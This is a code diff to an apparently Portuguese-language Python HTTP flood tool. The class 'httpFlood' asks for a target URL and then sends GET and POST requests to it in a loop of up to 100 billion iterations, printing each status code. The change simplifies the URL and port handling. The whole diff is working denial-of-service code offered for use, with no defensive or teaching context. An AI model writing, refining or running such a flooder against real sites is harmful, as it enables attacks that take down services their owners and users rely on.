@@ -16,8 +16,7 @@ class httpFlood:
             logo()
 
             try:
-                url = input(Fore.CYAN + "Digite o ip/url (url.com): ")
-                port = input(Fore.CYAN+"digite a porta: ")
+                url = input(Fore.CYAN + "Digite o ip/url (http ou https://url.com): ")
                 
                 if not url:
                     print(Fore.YELLOW + "url em branco!!")
@@ -46,17 +45,9 @@ class httpFlood:
                 exit()
 
             for i in range(1, 100000000000):
-                if port == 80:
-                	get = requests.get(f"http://{url}")
-                	post = requests.post(f"http://{url}")
-                	
-                	print(Fore.GREEN + f"status do flood:", get.status_code, f"{i}" + Style.RESET_ALL)
-                	
-                else:
-                	get = requests.get(f"https://{url}")
-                	post = requests.post(f"https://{url}")
-                	
-                	print(Fore.GREEN + f"status do flood:", get.status_code, f"{i}" + Style.RESET_ALL)
+                get = requests.get(url)
+                post = requests.post(url)
+                print(Fore.GREEN + f"status do flood:", get.status_code, f"{i}" + Style.RESET_ALL)
                 	
         except KeyboardInterrupt:
             print(Fore.RED + "saindo..." + Style.RESET_ALL)
